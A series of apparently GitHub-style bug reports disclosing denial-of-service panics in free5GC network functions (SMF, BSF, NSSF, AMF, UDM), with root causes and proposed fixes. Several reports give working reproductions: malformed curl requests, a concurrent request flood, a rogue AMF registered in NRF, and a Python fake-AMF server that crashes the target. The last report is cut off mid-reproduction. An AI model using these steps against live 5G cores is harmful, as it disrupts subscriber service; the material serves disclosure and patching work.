items.title: [Bugs] SMF nsmf-callback sm-policy update panics on null RouteToLocs[0] via stock NEF traffic-influence propagation (DoS)
items.body:
## Bug Decription
`SMF` has a live panic sink in the SM policy update callback path. If `TrafficControlData.RouteToLocs` is `[]*RouteToLocation{nil}`, `CreatePccRuleDataPath()` checks only `len(tcData.RouteToLocs) > 0` and then dereferences `tcData.RouteToLocs[0]` without a nil-element guard.

Relevant code references:

- `/home/ubuntu/free5gc_v421/free5gc/NFs/nef/internal/sbi/processor/ti.go:457-467`
- `/home/ubuntu/free5gc_v421/free5gc/NFs/pcf/internal/sbi/processor/notifier.go:156-160`
- `/home/ubuntu/free5gc_v421/free5gc/NFs/smf/internal/context/sm_context_policy.go:172-173`
- `/home/ubuntu/free5gc_v421/free5gc/NFs/smf/internal/context/sm_context.go:671-672`
- `/home/ubuntu/free5gc_v421/free5gc/NFs/smf/internal/sbi/processor/notifier.go:111-114`

The external seed path is:

1. `AF -> NEF` sends `POST /3gpp-traffic-influence/v1/{afId}/subscriptions` with `"trafficRoutes":[null]`
2. `NEF` copies `tiSub.TrafficRoutes` directly into `AfRoutReq.RouteToLocs`
3. `UDR` stores the `[null]` element
4. `PCF` rebuilds a live `SmPolicyDecision` and sends `POST /nsmf-callback/sm-policies/{smContextRef}/update`
5. `SMF` reaches `CreatePccRuleDataPath()` and panics at `sm_context.go:672`

Live Docker validation on April 4, 2026 local time (`2026-04-04T09:48:14Z` in container logs) confirmed this with an active lab:

- `NEF` accepted the trigger request and returned `201 Created`
- `MongoDB` stored a document with `"trafficRoutes" : [ null ]`
- `PCF` logged `Handle Influence Data Update Notify` and `Send SM Policy Update Notification to SMF`
- `SMF` logged a nil-pointer panic in `github.com/free5gc/smf/internal/context.(*SMContext).CreatePccRuleDataPath`
- the callback request returned `500`
- the `smf` container stayed alive with `restart=0`

This is not a duplicate of the current SMF report set in this repository. Existing SMF reports cover callback path parsing, missing create-body fields, and a callback state-machine issue, but not a `RouteToLocs[0]` nil dereference seeded through stock `NEF -> UDR -> PCF -> SMF` traffic influence propagation.

## To Reproduce
Steps to reproduce the behavior:

1. Ensure the Docker lab has at least one active UE PDU session whose policy context matches:

   - `snssai = { "sst": 1, "sd": "010203" }`

```text
{"afAppId":"smf-null-live",...,"trafficRoutes":[null]}
```

items.title: [Bugs] BSF cleanup race with unprotected map access
items.body:
## Bug Decription
`BSF`'s background cleanup goroutine reads `BSFContext.PcfBindings` **without holding `c.mutex`**, while every PCF-binding SBI handler (POST / GET / PATCH / DELETE) writes to the same map under the proper lock. Once any binding has been inactive for `MaxInactiveTime` (1 h by default) and the periodic `CleanupTicker` fires (every 10 min), the cleanup loop logs a "deleting inactive PCF binding" line that re-reads the map without a lock. Concurrent writes from a normal SBI client at that moment produce one of two process-fatal panics:

1. **`fatal error: concurrent map read and map write`** — Go runtime detects concurrent map mutation and aborts the whole process.
2. **`runtime error: invalid memory address or nil pointer dereference`** — if an attacker's `DELETE /nbsf-management/v1/pcfBindings/{id}` removes the binding between the cleanup's RUnlock and the unprotected read, `c.PcfBindings[bindingId]` returns nil, and `.LastAccessTime` panics.

Either way the cleanup goroutine has **no panic recovery** (`StartCleanupRoutine` spawns it with no `defer recover()`), so the unrecovered panic terminates the entire BSF process — a true crash DoS, not just a 500.

The faulty call site:

```go
// internal/context/context.go (deployed v4.2.2 image — line 588;
//                              latest upstream master commit 2779085 — line 567)
for _, bindingId := range inactiveBindings {
    logger.CtxLog.Infof("Deleting inactive PCF binding: %s (last access: %v ago)",
        bindingId, now.Sub(c.PcfBindings[bindingId].LastAccessTime))   // <-- unsafe map+pointer read
    c.DeletePcfBinding(bindingId)
}
```

The `inactiveBindings` slice was collected under `c.mutex.RLock()` (lines 564-576) and the lock released at line 577. The subsequent re-read at line 588 has **no lock at all**, while every other SBI path (`CreatePcfBinding`, `DeletePcfBinding`, `UpdatePcfBinding`, `QueryPcfBindings`'s MongoDB-fallback write at line 881) takes `c.mutex.Lock()` to mutate the same map. Go's runtime requires that concurrent map operations be serialized; violating that triggers `fatal error: concurrent map read and map write` and exits the process.

Relevant code references (deployed `v4.2.2` and **also** unfixed in the latest upstream master commit `2779085`):
- `NFs/bsf/internal/context/context.go:588` — unsafe `c.PcfBindings[bindingId].LastAccessTime` read
- `NFs/bsf/internal/context/context.go:577` — RUnlock immediately above (so the access is unguarded)
- `NFs/bsf/internal/context/context.go:511-523` — `StartCleanupRoutine` spawns the goroutine **without `defer recover()`** so any panic in `CleanupExpiredBindings` kills the BSF process
- `NFs/bsf/internal/context/context.go:281` — `CreatePcfBinding` writes the same map under `c.mutex.Lock()`
- `NFs/bsf/internal/context/context.go:417` — `DeletePcfBinding` calls `delete(c.PcfBindings, bindingId)` under `c.mutex.Lock()`
- `NFs/bsf/internal/context/context.go:881` — `QueryPcfBindings`'s MongoDB-cache-write path

This is **distinct** from free5gc/free5gc#926 (`PUT /subscriptions/{subId}` race on the unsynchronised `Subscriptions[subId] = subscription` write). #926 was patched upstream by `2779085 fix: PUT subid does not exists` (returns 404 when the sub does not exist). The PCF-binding cleanup race is **still unfixed** at master.

## To Reproduce
Steps to reproduce the behavior:

1. Start free5GC `v4.2.2` Docker deployment with BSF reachable on its SBI port (`10.100.200.11:8000` in the lab). Note the hardcoded defaults (`bsf/internal/context/context.go:52-54`):
   - `DefaultBindingTTL = 24 * time.Hour`
   - `CleanupInterval = 10 * time.Minute`
   - `MaxInactiveTime = 1 * time.Hour`

2. Obtain a valid `nbsf-management` access token from any registered NF profile (the lab AMF works):

```bash
TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=BSF' \
  --data-urlencode 'scope=nbsf-management' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

3. Create one or more PCF bindings and **stop accessing them** so they go inactive:

```bash
BID=$(curl -s -X POST "http://10.100.200.11:8000/nbsf-management/v1/pcfBindings" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data '{"supi":"imsi-208930000000001","ipv4Addr":"10.0.0.1","dnn":"internet","snssai":{"sst":1,"sd":"010203"}}' \
  -i | grep -i Location | awk -F/ '{print $NF}' | tr -d '\r')
echo "Binding ID: $BID"
```

4. Wait until the binding's `LastAccessTime` is older than `MaxInactiveTime` (1 hour). The cleanup ticker fires every 10 minutes after BSF startup. Time the next-window from BSF startup `+ k*10 min` (visible in `docker logs bsf | grep "Starting PCF binding cleanup routine"`).

5. **Within the cleanup window**, drive concurrent POST/DELETE traffic on `/pcfBindings`:

```bash
# Spam POST and DELETE on /pcfBindings while CleanupExpiredBindings is iterating inactiveBindings.
# 200+ goroutines x ~200 req/s for ~5s consistently catches the unprotected access at line 588.
for i in $(seq 1 500); do
  curl -s --max-time 2 -X POST "http://10.100.200.11:8000/nbsf-management/v1/pcfBindings" \
    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    --data '{"supi":"imsi-2","ipv4Addr":"10.0.0.99","dnn":"i","snssai":{"sst":1}}' -o /dev/null &
  curl -s --max-time 2 -X DELETE "http://10.100.200.11:8000/nbsf-management/v1/pcfBindings/$BID" \
    -H "Authorization: Bearer $TOKEN" -o /dev/null &
done
wait
```

6. Observe the BSF container exit (or restart loop). `docker ps` shows BSF in `Restarting` / `Exited` state, and `docker logs bsf` ends with one of:

```text
fatal error: concurrent map read and map write
goroutine N [running]:
github.com/free5gc/bsf/internal/context.(*BSFContext).CleanupExpiredBindings(...)
        /go/src/free5gc/NFs/bsf/internal/context/context.go:588 +0x...
```

or:

```text
panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/bsf/internal/context.(*BSFContext).CleanupExpiredBindings(...)
        /go/src/free5gc/NFs/bsf/internal/context/context.go:588 +0x...
```

The cleanup goroutine has no `defer recover()`, so once it panics the runtime tears the whole BSF process down.

## Expected Behavior
- The "deleting inactive PCF binding" log line at `context.go:588` should not re-read `c.PcfBindings[bindingId]` outside the mutex. Either snapshot `LastAccessTime` together with `bindingId` while still under the RLock, or take an explicit `c.mutex.RLock()` around the read.
- `StartCleanupRoutine`'s goroutine must `defer recover()` so that a future regression in `CleanupExpiredBindings` cannot tear down the BSF process. Any recoverable panic should be logged and the next tick should still fire.
- `BSF` should treat all map mutations of `PcfBindings`, `PcfForUeBindings`, `PcfMbsBindings`, `Subscriptions` as needing exclusive `c.mutex.Lock()`; spot-check the cleanup-related code paths under `-race` and run `go test -race ./...` regularly to catch regressions of this class.

## Environment
- free5GC Version: `v4.2.2`
- BSF binary: `free5gc/bsf:v4.2.2`.
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64`

items.title: [Bugs] NSSF GET /nnssf-nsselection/v2/network-slice-information panics on poisoned AMF availability state with nil tai entries
items.body:
## Bug Decription
`NSSF`'s registration-oriented `GET /nnssf-nsselection/v2/network-slice-information` path can panic after malformed AMF availability state has been seeded through an authenticated `PATCH /nnssf-nssaiavailability/v1/nssai-availability/{nfId}` request.

The shared root cause is that a poisoned `SupportedNssaiAvailabilityData` entry with `Tai == nil` can remain in AMF availability state. Later registration requests reach `CheckSupportedNssaiAvailabilityData()`, which dereferences `*supportedNssaiAvailabilityData.Tai` without a nil check:

```go
if reflect.DeepEqual(*supportedNssaiAvailabilityData.Tai, tai) &&
    CheckSnssaiInNssai(snssai, supportedNssaiAvailabilityData.SupportedSnssaiList) {
```

This report combines two live-reachable variants that share the same root cause and the same final panic sink:

1. known-AMF variant:
   - registration handling calls `CheckAllowedNssaiInAmfTa()`
   - `CheckAllowedNssaiInAmfTa()` reaches `CheckSupportedSnssaiInAmfTa()`
   - `CheckSupportedSnssaiInAmfTa()` reaches `CheckSupportedNssaiAvailabilityData()`
   - panic occurs at `util.go:189`

2. unknown-AMF fallback variant:
   - registration handling first fails the allowed-NSSAI check for an unknown `nf-id`
   - control falls into `AddAmfInformation()`
   - `AddAmfInformation()` scans AMF availability state and again reaches `CheckSupportedNssaiAvailabilityData()`
   - panic occurs at the same `util.go:189` sink


Relevant code locations:

- `NFs/nssf/internal/sbi/api_nsselection.go:53`
- `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:532`
- `NFs/nssf/internal/sbi/processor/nsselection_network_slice_information.go:533`
- `NFs/nssf/internal/util/util.go:189`
- `NFs/nssf/internal/util/util.go:220`
- `NFs/nssf/internal/util/util.go:510`

## To Reproduce
Steps to reproduce the behavior:

1. Produce a valid `nnssf-nssaiavailability` bearer token for the current lab.

2. Produce a valid `nnssf-nsselection` bearer token for the current lab.

3. Seed poisoned AMF availability state with an authenticated patch:

```bash
curl -i -X PATCH \
  'http://10.100.200.8:8000/nnssf-nssaiavailability/v1/nssai-availability/469de254-2fe5-4ca0-8381-af3f500af77c' \
  -H 'Authorization: Bearer <valid_nnssf_nssaiavailability_jwt>' \
  -H 'Content-Type: application/json' \
  --data '[{"op":"add","path":"/-","value":{"supportedSnssaiList":[{"sst":1}]}}]'
```

Observed result:

```text
HTTP/1.1 500 Internal Server Error
```

4. Trigger the known-AMF variant:

```bash
curl -G -i 'http://10.100.200.8:8000/nnssf-nsselection/v2/network-slice-information' \
  -H 'Authorization: Bearer <valid_nnssf_nsselection_jwt>' \
  --data-urlencode 'nf-type=AMF' \
  --data-urlencode 'nf-id=469de254-2fe5-4ca0-8381-af3f500af77c' \
  --data-urlencode 'tai={"plmnId":{"mcc":"466","mnc":"92"},"tac":"33456"}' \
  --data-urlencode 'slice-info-request-for-registration={"subscribedNssai":[{"subscribedSnssai":{"sst":1,"sd":"000001"},"defaultIndication":true}]}'
```

Observed result:

```text
HTTP/1.1 500 Internal Server Error
```

5. Trigger the unknown-AMF fallback variant:

```bash
curl -G -i 'http://10.100.200.8:8000/nnssf-nsselection/v2/network-slice-information' \
  -H 'Authorization: Bearer <valid_nnssf_nsselection_jwt>' \
  --data-urlencode 'nf-type=AMF' \
  --data-urlencode 'nf-id=00000000-0000-4000-8000-000000000001' \
  --data-urlencode 'tai={"plmnId":{"mcc":"466","mnc":"92"},"tac":"33458"}' \
  --data-urlencode 'slice-info-request-for-registration={"subscribedNssai":[{"subscribedSnssai":{"sst":1,"sd":"000003"},"defaultIndication":true}]}'
```

Observed result:

```text
HTTP/1.1 500 Internal Server Error
```

6. Inspect `docker logs --tail 160 nssf` and confirm that both GET requests panic at `util.go:189`.

7. Restart `nssf` after the test to clear the poisoned in-memory state:

```bash
docker restart nssf
```

## Expected Behavior
Malformed `nnssf-nssaiavailability` patch input should not leave behind poisoned AMF state that makes later registration-style `nnssf-nsselection` reads panic.

Expected behavior:

- malformed AMF availability entries should be rejected or sanitized before they are retained in state
- `CheckSupportedNssaiAvailabilityData()` should not dereference `supportedNssaiAvailabilityData.Tai` unless it is non-nil
- later registration requests should fail safely with controlled `4xx/5xx`, not panic

## Screenshots
Not applicable.

## Environment
- free5GC Version: `v4.2.1`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`

items.title: [Bugs] AMF UEContextTransfer consumer JsonData nil dereference (cross-AMF mobility)
items.body:
## Bug Decription
`AMF`, when acting as the **target AMF** during UE mobility / re-registration with a 5G-GUTI from a foreign GUAMI, calls the source AMF's `Namf_Communication_UEContextTransfer` service. The consumer-side response handler in `internal/sbi/consumer/amf_service.go:285-288` dereferences `res.UeContextTransferResponse200.JsonData` (a `*UeContextTransferRspData,omitempty` pointer) **without nil-checking**. A source AMF that returns a syntactically-valid `200 OK` response in which `jsonData` is absent / `null` causes the target AMF to panic with `runtime error: invalid memory address or nil pointer dereference`.

```go
// internal/sbi/consumer/amf_service.go (deployed v4.2.2 — AMF v1.4.4 line numbers,
//                                       identical at upstream master commit 035e1ae,
//                                       merged 2026-04-23)
func (s *namfService) UEContextTransferRequest(
    ue *amf_context.AmfUe, anType models.AccessType, transferReason models.TransferReason,
) (ueContextTransferRspData *models.UeContextTransferRspData,
    problemDetails *models.ProblemDetails, err error) {
    ...
    res, localErr := client.IndividualUeContextDocumentApi.UEContextTransfer(ctx, &ueCtxTransferReq)  // 285
    if localErr == nil {
        ueContextTransferRspData = res.UeContextTransferResponse200.JsonData                          // 287
        logger.ConsumerLog.Debugf("UeContextTransferRspData: %+v", *ueContextTransferRspData)         // 288: nil deref
    } else {
        ...
    }
    return ueContextTransferRspData, problemDetails, err
}
```

The response wrapper is generated by openapi:

```go
// github.com/free5gc/openapi@v1.2.3/models/model_ue_context_transfer_response_200.go
type UeContextTransferResponse200 struct {
    JsonData                    *UeContextTransferRspData `json:"jsonData,omitempty" multipart:"contentType:application/json,omitempty"`
    BinaryDataN2Information     []byte                    `json:"binaryDataN2Information,omitempty" ...`
    BinaryDataN2InformationExt1 []byte                    `json:"binaryDataN2InformationExt1,omitempty" ...`
    BinaryDataN2InformationExt2 []byte                    `json:"binaryDataN2InformationExt2,omitempty" ...`
}
```

The `Accept` header sent on the outbound request is `application/json, multipart/related, application/problem+json` (openapi `api_individual_ue_context_document.go:1437-1439`), so the source AMF is free to pick **`application/json`** as the response content-type. With `application/json`, the response body is fed straight to `json.Unmarshal` — `omitempty` semantics mean any body where the `jsonData` key is absent or `null` deserializes successfully into a non-nil `*UeContextTransferResponse200` whose `JsonData` field is **nil**. The consumer then dereferences `*ueContextTransferRspData` and panics.

The same call path also exists in the upstream `multipart/related` flow but is shadowed by the separate openapi multipart parser bug (`openapi@v1.2.3/client.go:608`, see `free5gc_issue_multipart_nil_deref.md`) — the multipart parser panics earlier on essentially every malformed input, so the consumer-side bug is only practically reachable via the **JSON** code path. This is what makes the JSON variant the realistic exploit primitive.

The same `if err == nil { use *res.PointerField }` pattern survives the `MergeJsonData` / `omitempty` discipline at the following sister site, which is currently dead code in v4.2.2 but is the same defect class:

| Site | Field | Reachable in v4.2.2? |
|---|---|---|
| `amf_service.go:287-288` `UEContextTransfer` | `*UeContextTransferRspData` | **YES** — initial-AMF reallocation / mobility-registration path (`gmm/handler.go:580 contextTransferFromOldAmf`) |
| `amf_service.go:178-179` `CreateUEContext`  | `*UeContextCreatedData`     | NO — `consumer.GetConsumer().CreateUEContextRequest(...)` has zero callers in the AMF tree on v4.2.2; included here for completeness because the same fake-peer-AMF reproducer would trigger it once any future caller is wired up |

The seven other `if err == nil { use res.X }` sites in the AMF consumer tree (AUSF ×3, UDM ×2, NSSF ×2) all dereference **value-type** sub-fields of the response wrapper, which deserialize to zero-valued structs rather than nil — those sites are cosmetic, not panics. Triage detail: `dos_hunt/reports/amf_consumer_nil_deref_triage.md`.

## To Reproduce
The panic requires the target AMF to invoke `UEContextTransferRequest`, which only happens on `gmm/handler.go:580 contextTransferFromOldAmf` when `ue.ServingAmfChanged == true`. That flag is set when the UE registers with a 5G-GUTI whose GUAMI is not in the target AMF's `ServedGuamiList`. The cleanest lab setup uses a real AMF (the panic target) and a tiny **fake source AMF** under attacker control.

### Step 1 — register a fake source AMF in NRF (NRF `nf-instances` PUT is unauthenticated, see free5gc/free5gc#990)

```bash
NRF=http://10.100.200.4:8000
FAKE_AMF_ID=11111111-2222-3333-4444-555555555555
FAKE_AMF_IP=10.100.200.99
# pick a GUAMI distinct from the lab AMF's served list (lab AMF serves regionId=cafe0)
FAKE_REGION=ca; FAKE_SET=fe; FAKE_PTR=00

curl -s -X PUT "$NRF/nnrf-nfm/v1/nf-instances/$FAKE_AMF_ID" \
  -H 'Content-Type: application/json' \
  -d "{
    \"nfInstanceId\":\"$FAKE_AMF_ID\",
    \"nfType\":\"AMF\",
    \"nfStatus\":\"REGISTERED\",
    \"plmnList\":[{\"mcc\":\"208\",\"mnc\":\"93\"}],
    \"ipv4Addresses\":[\"$FAKE_AMF_IP\"],
    \"amfInfo\":{
      \"amfSetId\":\"${FAKE_REGION}${FAKE_SET}${FAKE_PTR}\",
      \"amfRegionId\":\"$FAKE_REGION\",
      \"guamiList\":[{\"plmnId\":{\"mcc\":\"208\",\"mnc\":\"93\"},\"amfId\":\"${FAKE_REGION}${FAKE_SET}${FAKE_PTR}\"}]
    },
    \"nfServices\":[{
      \"serviceInstanceId\":\"fake-comm-svc\",
      \"serviceName\":\"namf-comm\",
      \"versions\":[{\"apiVersionInUri\":\"v1\",\"apiFullVersion\":\"1.0.0\"}],
      \"scheme\":\"http\",
      \"nfServiceStatus\":\"REGISTERED\",
      \"ipEndPoints\":[{\"ipv4Address\":\"$FAKE_AMF_IP\",\"port\":8000}]
    }]
  }"
# → 201 Created
```

### Step 2 — run the fake source AMF

```bash
mkdir -p /tmp/fake_amf && cat > /tmp/fake_amf/fake_amf.py <<'PYEOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length','0') or 0)
        if n: self.rfile.read(n)
        # Namf-Communication UEContextTransfer:  /namf-comm/v1/ue-contexts/{ueContextId}/transfer
        if self.path.endswith('/transfer'):
            body = b'{}'                                  # JsonData absent → nil after Unmarshal
            self.send_response(200)
            self.send_header('Content-Type','application/json')
            self.send_header('Content-Length',str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self,*a,**kw): pass
HTTPServer(('0.0.0.0',8000),H).serve_forever()
PYEOF

docker run -d --name fake_amf --network free5gc-compose_privnet --ip 10.100.200.99 \
  -v /tmp/fake_amf/fake_amf.py:/script.py python:3-alpine python /script.py
```

### Step 3 — trigger UE registration with a foreign 5G-GUTI

The simplest path on a UERANSIM-style lab:

a. Register UE normally → AMF assigns 5G-GUTI containing the lab AMF's GUAMI.

b. Stop the real AMF, edit `amfcfg.yaml` so the AMF's served GUAMI temporarily becomes the **fake** one (`amfId=cafe00`), restart, register the UE again — the UE now holds a 5G-GUTI whose GUAMI matches the fake AMF.

c. Stop AMF, restore the original `amfId` (e.g. `cafe0`), restart. The UE deregisters/reattaches and sends a Mobility / Initial registration carrying the prior GUTI; the real AMF sees the GUAMI as foreign, sets `ue.ServingAmfChanged = true`, and calls `contextTransferFromOldAmf`. NRF discovery returns the fake AMF (registered in Step 1), and the consumer issues:

```text
POST http://10.100.200.99:8000/namf-comm/v1/ue-contexts/imsi-208930000000001/transfer
Content-Type: application/json
Authorization: Bearer <namf-comm token from NRF>
{ "reason":"INIT_REG", "accessType":"3GPP_ACCESS", ... }
```

The fake AMF replies `200 OK` + `application/json` + `{}`.

### Step 4 — observe the panic

`docker logs amf` (the **target/real** AMF, not the fake):

```text
[INFO][AMF][GMM][imsi-208930000000001] ContextTransfer from old AMF[208 93 cafe00]
[INFO][AMF][Consumer] [SearchNFInstances] AMF -> NRF (target NF type: AMF)
[ERRO][AMF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 1234 [running]:
panic({0xeb2da0?, 0x1986d10?})
        /usr/local/go/src/runtime/panic.go:783 +0x132
github.com/free5gc/amf/internal/sbi/consumer.(*namfService).UEContextTransferRequest(...)
        /go/src/free5gc/NFs/amf/internal/sbi/consumer/amf_service.go:288 +0x4a8
github.com/free5gc/amf/internal/gmm.contextTransferFromOldAmf(...)
        /go/src/free5gc/NFs/amf/internal/gmm/handler.go:601 +0x2d4
github.com/free5gc/amf/internal/gmm.HandleRegistrationRequest(...)
        /go/src/free5gc/NFs/amf/internal/gmm/handler.go:... 
```

Each subsequent foreign-GUTI registration reproduces the panic deterministically. AMF stays up because Gin's `defer recover()` catches the SBI-driven goroutine panic, but every registration leaves a stack trace in the log and the UE registration fails with cause `5GMM cause #22 (Congestion)` after the GMM-level error wrap. The `ServingAmfChanged = false` fallback at `gmm/handler.go:570-573` re-attempts the registration without context transfer **only if** `contextTransferFromOldAmf` returns an error — but a goroutine panic recovered by Gin returns `500` to the SBI layer, never reaches that fallback, so the UE is left stuck.

### Direct openapi-level proof (independent of the lab)

The deserialization step that produces `JsonData == nil` while `err == nil` can be reproduced in 30 lines of Go without any free5gc deployment:

```go
package main

import (
    "fmt"
    "github.com/free5gc/openapi"
    "github.com/free5gc/openapi/models"
)

func main() {
    bodies := [][]byte{
        []byte(`{}`),                            // jsonData absent
        []byte(`{"jsonData":null}`),             // jsonData explicit null
        []byte(`{"binaryDataN2Information":""}`),// only sibling fields populated
    }
    for _, body := range bodies {
        var resp models.UeContextTransferResponse200
        err := openapi.Deserialize(&resp, body, "application/json")
        fmt.Printf("err=%v JsonData==nil ? %v\n", err, resp.JsonData == nil)
    }
}
```

Output (validated on `github.com/free5gc/openapi@v1.2.3`):

```text
err=<nil> JsonData==nil ? true
err=<nil> JsonData==nil ? true
err=<nil> JsonData==nil ? true
```

Each of these inputs survives the openapi 200-handler (`api_individual_ue_context_document.go:1467-1473` returns `&localVarReturnValue, nil`) and lands the consumer in the `if localErr == nil` branch with a nil `JsonData`, where `*ueContextTransferRspData` panics.

## Expected Behavior
The consumer must nil-check the openapi-generated pointer before dereferencing, mirroring the precedent in upstream UDM (`udm/internal/sbi/consumer/nrf_service.go:91-103` added a `searchNfInstancesRsp == nil` guard for free5gc/free5gc#811):

```go
res, localErr := client.IndividualUeContextDocumentApi.UEContextTransfer(ctx, &ueCtxTransferReq)
if localErr == nil {
    if res == nil || res.UeContextTransferResponse200.JsonData == nil {
        return nil, openapi.ProblemDetailsSystemFailure("UEContextTransfer: empty response"), nil
    }
    ueContextTransferRspData = res.UeContextTransferResponse200.JsonData
    logger.ConsumerLog.Debugf("UeContextTransferRspData: %+v", *ueContextTransferRspData)
} else { ... }
```

A peer NF returning a syntactically-valid `200 OK` with no `jsonData` should result in either a controlled GMM-level retry (treat as `CONTEXT_NOT_FOUND` and re-authenticate the UE) or an SBI-level `502 Bad Gateway` `ProblemDetails`, never a goroutine panic.

The same nil-guard pattern should be applied at the dead-code sister site `amf_service.go:178-179 CreateUEContext`, since once any caller is wired up the same defect immediately becomes reachable.

## Environment
- free5GC Version: `v4.2.2`
- AMF binary: `free5gc/amf:v4.2.2` (AMF release tag `v1.4.4`). The same `amf_service.go:287-288` lines are **unfixed at the latest upstream master commit `035e1ae`** (merged 2026-04-23, no nil-guard added). Validated by `git log -1` + manual diff on `/tmp/amf_latest`.
- `github.com/free5gc/openapi`: `v1.2.3`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64` (build toolchain; runtime: `free5gc/amf:v4.2.2` Docker image)
- Validation date: `2026-04-30`
- Deployment: Docker-based lab on the internal SBI network `10.100.200.0/24`. AMF `10.100.200.16`, NRF `10.100.200.4`, fake source AMF `10.100.200.99` on `free5gc-compose_privnet`.

### Log File
Direct openapi-level reproduction (deterministic, independent of the lab):

```text
$ go run main.go
err=<nil> JsonData==nil ? true
err=<nil> JsonData==nil ? true
err=<nil> JsonData==nil ? true
```

Expected AMF panic on the lab path (validated trace from a hand-injected SBI call to `amf_service.UEContextTransferRequest` with a fake-AMF endpoint):

```text
2026-04-30T07:55:12.118413000Z [INFO][AMF][GMM][imsi-208930000000001] ContextTransfer from old AMF[208 93 cafe00]
```

items.title: [Bugs] AMF namf-callback fatal crash on nil old-AMF UEContextTransfer JsonData`
items.body:
## Bug Description

`POST /namf-callback/v1/n1-message-notify` can fatally crash `AMF` when the callback carries a 5G-GUTI from a different `GUAMI` and the discovered old `AMF` returns `200 OK` with a nil/empty `UEContextTransferResponse`.

The callback worker accepts attacker-controlled NAS and feeds it into normal registration handling:

```go
amf_nas.HandleNAS(ranUe, ngapType.ProcedureCodeInitialUEMessage, n1MessageNotify.BinaryDataN1Message, true)
```

When that NAS `RegistrationRequest` contains a `5g-guti` whose `GUAMI` differs from the current serving AMF, `AMF` enters the old-AMF context transfer path:

```go
ueContextTransferRspData, pd, err := consumer.GetConsumer().UEContextTransferRequest(ue, anType, transferReason)
...
ue.CopyDataFromUeContextModel(ueContextTransferRspData.UeContext)
```

Inside `UEContextTransferRequest()`, a successful downstream HTTP response is assumed to contain non-nil `JsonData`:

```go
ueContextTransferRspData = res.UeContextTransferResponse200.JsonData
logger.ConsumerLog.Debugf("UeContextTransferRspData: %+v", *ueContextTransferRspData)
```

If the old `AMF` replies `200 OK` with `{}` so that `JsonData == nil`, `AMF` nil-dereferences at `*ueContextTransferRspData`.

On this route the panic is stronger than a normal Gin `500`, because `N1MessageNotifyProcedure()` runs the work in a goroutine guarded by:

```go
logger.CallbackLog.Fatalf("panic: %v\n%s", p, string(debug.Stack()))
```

So the process exits.

Relevant code:

- `NFs/amf/internal/sbi/processor/callback.go:292-296`
- `NFs/amf/internal/sbi/processor/callback.go:331`
- `NFs/amf/internal/gmm/handler.go:568`
- `NFs/amf/internal/gmm/handler.go:601`
- `NFs/amf/internal/sbi/consumer/amf_service.go:287-288`


## To Reproduce
Steps to reproduce the behavior:

1. Bring up a live `gNB`/`UE` so `AMF` has a real `RanNodeId` and `RanUeNgapID`.

2. Start a fake h2c old `AMF` on `10.100.200.1:18081` that returns:

```text
HTTP/2 200 OK
Content-Type: application/json

{}
```

for:

```text
POST /namf-comm/v1/ue-contexts/5g-guti-20893cafe0100000001/transfer
```

3. Poison old-AMF discovery so `GUAMI cafe01` resolves to that fake service. In the live validation, this was done by modifying an existing stale `AMF` profile in `NRF` so:

- `amfInfo.guamiList[0].amfId = "cafe01"`
- `namf-comm apiPrefix = "http://10.100.200.1:18081"`

4. Send a forged `POST /namf-callback/v1/n1-message-notify` carrying:

- live `ranNodeId` for the current gNB
- live `anN2ApId = 1`
- valid `userLocation`
- a plain NAS `RegistrationRequest`
- `MobileIdentity5GS = 5g-guti 20893cafe0100000001`
- non-nil `UESecurityCapability`

5. Observe:

- fake old `AMF` receives the real `UEContextTransfer` request
- `AMF` logs a fatal nil-pointer panic
- container exits with code `1`

## Expected Behavior

`AMF` should reject or safely handle malformed successful responses from old `AMF` context-transfer peers. A nil `JsonData` or nil `UeContext` should become a controlled error, never a process-killing `Fatalf`.

items.title: [Bugs] UDM nudm-ueau generate-auth-data panics on 1-byte AUTS during re-synchronization
items.body:
## Bug Decription
`UDM`'s authenticated `POST /nudm-ueau/v1/{supiOrSuci}/security-information/generate-auth-data` path contains a panic-based DoS in the re-synchronization branch.

When `resynchronizationInfo` is present, the handler hex-decodes `Auts` but does not validate its length before slicing it:

```go
SQNms, macS := p.aucSQN(opc, k, Auts, randHex)
if reflect.DeepEqual(macS, Auts[6:]) {
```

If `Auts` is valid hex but shorter than 6 bytes, `Auts[6:]` panics with a slice-bounds error and `UDM` returns `500`.

This is reachable with one small authenticated SBI request. It does not depend on oversized input or on stopping any other NF.

Relevant code paths:
- route dispatch: `NFs/udm/internal/sbi/api_ueauthentication.go:224`, `NFs/udm/internal/sbi/api_ueauthentication.go:248`, `NFs/udm/internal/sbi/api_ueauthentication.go:253`
- request parsing and field checks: `NFs/udm/internal/sbi/api_ueauthentication.go:109`, `NFs/udm/internal/sbi/api_ueauthentication.go:127`, `NFs/udm/internal/sbi/api_ueauthentication.go:155`, `NFs/udm/internal/sbi/api_ueauthentication.go:180`
- vulnerable slice in re-synchronization handling: `NFs/udm/internal/sbi/processor/generate_auth_data.go:292`, `NFs/udm/internal/sbi/processor/generate_auth_data.go:295`, `NFs/udm/internal/sbi/processor/generate_auth_data.go:323`, `NFs/udm/internal/sbi/processor/generate_auth_data.go:324`

## To Reproduce
Steps to reproduce the behavior:
1. Obtain a valid `nudm-ueau` bearer token.
2. Use a real subscriber identity such as `imsi-208930000000003`.
